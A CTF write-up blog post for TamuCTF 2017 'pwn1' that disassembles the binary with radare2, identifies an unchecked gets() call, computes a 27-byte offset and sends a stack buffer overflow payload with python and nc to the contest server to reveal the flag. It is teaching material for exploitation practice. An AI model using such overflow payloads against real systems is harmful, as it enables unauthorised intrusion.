---
author:
  email: tzaoh1@gmail.com
  github: https://github.com/tzaoh
  image:
  - /images/avatar-64x64.png
  name:
  - Tzaoh
cardbackground: 'white'
cardtitlecolor: 'orange'
post_categories:
- CTFs
date: 2017-08-08T18:56:18+02:00
description: TamuCTF 2017 - pwn1
tags:
- CTF
- TamuCTF
- 2017
title: "TamuCTF 2017 - Pwn 1"
summary: "We are told that there is a binary running remotely and its code is available to download. Lets download and open it with r2."
cardthumbimage: "/assets/TamuCTF2017/title.png"
---

![Pwn1 Challenge Description](/assets/TamuCTF2017/pwn1/1-pwn1_description.png)

We are told that there is a binary running remotely and its code is available to download. Lets download and open it with r2.

```bash
$ wget https://ctf.tamu.edu/files/7e968d03d9caa11a2f4f2909bd3cabc9/pwn1
$ r2 -A pwn1  
```
> At some point the link will be broken, if so you can use the [one](https://github.com/BlackHoods/BlackHoods.github.io/raw/master/assets/TamuCTF2017/pwn1/pwn1) from the repository.

Now that the binary is opened, lets see some stuff inside it.

{{< highlight r2 "hl_lines=17 18" >}}
[0x08048450]> afl
0x08048390    3 35           sym._init
0x080483d0    1 6            sym.imp.gets
0x080483e0    1 6            sym.imp._IO_getc
0x080483f0    1 6            sym.imp.puts
0x08048400    1 6            sym.imp.__libc_start_main
0x08048410    1 6            sym.imp.setvbuf
0x08048420    1 6            sym.imp.fopen
0x08048430    1 6            sym.imp.putchar
0x08048440    1 6            sub.__gmon_start___252_440
0x08048450    1 33           entry0
0x08048480    1 4            sym.__x86.get_pc_thunk.bx
0x08048490    4 43           sym.deregister_tm_clones
0x080484c0    4 53           sym.register_tm_clones
0x08048500    3 30           sym.__do_global_dtors_aux
0x08048520    4 43   -> 40   sym.frame_dummy
0x0804854b    4 103          sym.print_flag
0x080485b2    4 120          main
0x08048630    4 93           sym.__libc_csu_init
0x08048690    1 2            sym.__libc_csu_fini
0x08048694    1 20           sym._fini
{{< /highlight >}}

Interesting, there is `print_flag` function at `0x0804854b`. Lets see what's inside of it.

{{< highlight r2 "hl_lines=17 18" >}}
[0x08048450]> s sym.print_flag 
[0x0804854b]> pdf 
┌ (fcn) sym.print_flag 103 
│   sym.print_flag ();
│           ; var int local_dh @ ebp-0xd
│           ; var int local_ch @ ebp-0xc
│              ; CALL XREF from 0x08048606 (main)
│           0x0804854b      55             push ebp
│           0x0804854c      89e5           ebp = esp
│           0x0804854e      83ec18         esp -= 0x18
│           0x08048551      83ec0c         esp -= 0xc
│           0x08048554      68b0860408     push str.How_did_you_figure_out_my_secret__
│           0x08048559      e892feffff     sym.imp.puts ()
│           0x0804855e      83c410         esp += 0x10
│           0x08048561      83ec08         esp -= 8
│           0x08048564      68d3860408     push 0x80486d3
│           0x08048569      68d5860408     push str.flag.txt
│           0x0804856e      e8adfeffff     sym.imp.fopen ()
│           0x08048573      83c410         esp += 0x10
│           0x08048576      8945f4         dword [local_ch] = eax
│       ┌─< 0x08048579      eb10           goto 0x804858b
│       │      ; JMP XREF from 0x080485a0 (sym.print_flag)
│      ┌──> 0x0804857b      0fbe45f3       eax = byte [local_dh]
│      |│   0x0804857f      83ec0c         esp -= 0xc
│      |│   0x08048582      50             push eax
│      |│   0x08048583      e8a8feffff     sym.imp.putchar ()
│      |│   0x08048588      83c410         esp += 0x10
│      ↑│      ; JMP XREF from 0x08048579 (sym.print_flag)
│      |└─> 0x0804858b      83ec0c         esp -= 0xc
│      |    0x0804858e      ff75f4         push dword [local_ch]
│      |    0x08048591      e84afeffff     sym.imp._IO_getc ()
│      |    0x08048596      83c410         esp += 0x10
│      |    0x08048599      8845f3         byte [local_dh] = al
│      |    0x0804859c      807df3ff       var = byte [local_dh] - 0xff
│      └──< 0x080485a0      75d9           if (var) goto 0x804857b
│           0x080485a2      83ec0c         esp -= 0xc
│           0x080485a5      6a0a           push 0xa
│           0x080485a7      e884feffff     sym.imp.putchar ()
│           0x080485ac      83c410         esp += 0x10
│           0x080485af      90             
└           0x080485b0      c9             
{{< /highlight >}}

Because of the offsets `0x08048569` and `0x0804856e`, we can deduce that the function opens a file called `flag.txt` and prints its content. Fantastic :v: , so we just need to know who will call `print_flag`. This can be figured out through the `axt` command of r2 which stands for "cross reference to" the current function.

```r2
[0x0804854b]> axt
call 0x8048606 call sym.print_flag in main
```

Cool, so this function will be called from offset `0x8048606` which belongs to `main` function. Lets see whats inside it.

{{< highlight r2 "hl_lines=30 31 32 34 35 36" >}}
[0x0804854b]> pdf @ main   
            ;-- main:
┌ (fcn) main 120
│   main ();
│           ; var int local_27h @ ebp-0x27
│           ; var int local_ch @ ebp-0xc
│           ; var int local_4h_2 @ ebp-0x4
│           ; var int local_4h @ esp+0x4
│              ; DATA XREF from 0x08048467 (entry0)
│           0x080485b2      8d4c2404       ecx = [local_4h]
│           0x080485b6      83e4f0         esp &= 0xfffffff0
│           0x080485b9      ff71fc         push dword [ecx - 4]
│           0x080485bc      55             push ebp
│           0x080485bd      89e5           ebp = esp
│           0x080485bf      51             push ecx
│           0x080485c0      83ec24         esp -= 0x24
│           0x080485c3      a130a00408     eax = dword obj.stdout
│           0x080485c8      6a00           push 0
│           0x080485ca      6a00           push 0
│           0x080485cc      6a02           push 2
│           0x080485ce      50             push eax
│           0x080485cf      e83cfeffff     sym.imp.setvbuf ()
│           0x080485d4      83c410         esp += 0x10
│           0x080485d7      83ec0c         esp -= 0xc
│           0x080485da      68de860408     push str.Enter_the_secret_word:
│           0x080485df      e80cfeffff     sym.imp.puts ()
│           0x080485e4      83c410         esp += 0x10
│           0x080485e7      c745f4000000.  dword [local_ch] = 0
│           0x080485ee      83ec0c         esp -= 0xc
│           0x080485f1      8d45d9         eax = [local_27h]
│           0x080485f4      50             push eax
│           0x080485f5      e8d6fdffff     sym.imp.gets ()
│           0x080485fa      83c410         esp += 0x10
│           0x080485fd      817df41eab11.  var = dword [local_ch] - 0xca11ab1e
│       ┌─< 0x08048604      7507           if (var) goto 0x804860d
│       │   0x08048606      e840ffffff     sym.print_flag ()
│      ┌──< 0x0804860b      eb10           goto 0x804861d
│      ││      ; JMP XREF from 0x08048604 (main)
│      │└─> 0x0804860d      83ec0c         esp -= 0xc
│      │    0x08048610      68f5860408     push str.That_is_not_the_secret_word_
│      │    0x08048615      e8d6fdffff     sym.imp.puts ()             ; int puts(const char *s)
│      │    0x0804861a      83c410         esp += 0x10
│      │       ; JMP XREF from 0x0804860b (main)
│      └──> 0x0804861d      b800000000     eax = 0
│           0x08048622      8b4dfc         ecx = dword [local_4h_2]
│           0x08048625      c9             
│           0x08048626      8d61fc         esp = [ecx - 4]
└           0x08048629      c3             
{{< /highlight >}}

We see that `print_flag` will be called if the condition `local_ch == 0xca11ab1e` is satisfied. But wait a moment, if we give a closer look to the assembly instrucctions we realized that the only variable we are supposed to edit is `local_27h` through the `gets` function.

> So what we need to do?

As maybe you know, `gets` is an unsecure function, because it does not check how many characters it must copy in memory when you introduce them. Then, if we input more characters than it is supposed to store, we will be able to overwrite neighbor local variables!

How can we know the length of the string we must provide? By knowing where the variables are stored onto the stack

![Pwn1 Stack diagram](/assets/TamuCTF2017/pwn1/5-pwn1_stack_view.png)

So finally, how many bytes do we need to start writting `local_ch`?
Easy!

`($ebp - 0xC) - ($ebp - 0x27)  = 0x27 - 0xC = 0x1B = 27d` 27 Characters.

```bash
$ python -c 'print("A"*27 + "\x1E\xAB\x11\xCA")' | nc pwn.ctf.tamu.edu 4322
Enter the secret word:
How did you figure out my secret?!
gigem{T00_435Y}
```

Answer: gigem{T00_435Y}

### Complete video

<a href="https://asciinema.org/a/2juhmtxkdf7qrnzbury7rzzjc?autoplay=1"><img src="https://asciinema.org/a/2juhmtxkdf7qrnzbury7rzzjc.png" width="400"/></a>

### Tools used:

 * [radare2](https://github.com/radare/radare2) - To analyze the binary.
 * [draw.io](https://www.draw.io/) - To draw some graphics.
 * [asciinema](https://asciinema.org) - To record the session.
